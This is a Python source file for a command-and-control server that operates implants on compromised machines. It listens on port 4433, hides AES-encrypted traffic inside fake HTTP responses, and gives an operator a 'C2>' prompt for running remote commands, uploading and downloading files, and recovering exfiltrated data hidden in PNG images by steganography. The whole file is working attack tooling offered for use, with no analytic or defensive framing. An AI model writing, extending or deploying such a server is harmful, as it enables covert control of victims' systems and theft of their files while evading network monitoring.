import socket
import base64
import threading
from Crypto.Cipher import AES
import hashlib
from PIL import Image
import io
import os

# === AES Crypto ===
def derive_key(secret):
    return hashlib.sha256(secret.encode()).digest()

def decrypt_msg(data, key):
    raw = base64.b64decode(data.encode())
    iv, ct = raw[:16], raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pad_len = ct[-1]
    return cipher.decrypt(ct)[:-pad_len].decode()

def encrypt_msg(msg, key):
    iv = os.urandom(16)
    pad_len = 16 - len(msg.encode()) % 16
    padded = msg.encode() + bytes([pad_len]) * pad_len
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(padded)
    return base64.b64encode(iv + ct).decode()

# === HTTP Wrap ===
def wrap_http(data):
    body = f"data={data}"
    req = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "\r\n" + body
    )
    return req.encode()

def unwrap_http(raw):
    try:
        body = raw.split(b"\r\n\r\n", 1)[1].decode()
        return body.split("data=", 1)[1]
    except Exception:
        return ""

# === Decode PNG LSB stego ===
def decode_stego_png(png_bytes):
    img = Image.open(io.BytesIO(png_bytes))
    pixels = img.load()
    bits = ''
    for y in range(img.height):
        for x in range(img.width):
            for color in pixels[x, y]:
                bits += str(color & 1)
    chars = [chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8)]
    return ''.join(chars).split('\x00', 1)[0]  # Trim excess nulls

# === C2 Handler ===
def handle_client(conn, addr, key):
    print(f"[+] Connection from {addr}")
    try:
        req = conn.recv(8192)
        data = unwrap_http(req)
        info = decrypt_msg(data, key)
        print(f"[Implant Info] {info}")

        cmd = input("C2> ").strip()

        if cmd.startswith("upload:"):
            filepath = cmd.split(":", 1)[1]
            if not os.path.isfile(filepath):
                print("[-] File not found.")
                conn.send(wrap_http(encrypt_msg("ERROR: No file", key)))
                return
            conn.send(wrap_http(encrypt_msg(cmd, key)))
            ack = unwrap_http(conn.recv(4096))
            if "ready" in decrypt_msg(ack, key):
                with open(filepath, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                conn.send(wrap_http(encrypt_msg(data, key)))
                print(decrypt_msg(unwrap_http(conn.recv(8192)), key))
        else:
            conn.send(wrap_http(encrypt_msg(cmd, key)))
            resp = unwrap_http(conn.recv(8192))

            if cmd.startswith("download:"):
                out = base64.b64decode(decrypt_msg(resp, key))
                with open("received_file", "wb") as f:
                    f.write(out)
                print("[+] File downloaded: received_file")
            elif len(resp) > 50000:  # Assume it's an image
                png_data = base64.b64decode(resp)
                extracted = decode_stego_png(png_data)
                print("[Stego Output]:\n", extracted)
                with open("exfil.png", "wb") as f:
                    f.write(png_data)
            else:
                print("[Output]:\n", decrypt_msg(resp, key))
    except Exception as e:
        print("[-] Error:", e)
    finally:
        conn.close()

# === Main Loop ===
def start_server():
    key = derive_key("project_secret")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4433))
    s.listen(5)
    print("[*] C2 server listening on port 4433...")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr, key)).start()

if __name__ == "__main__":
    start_server()
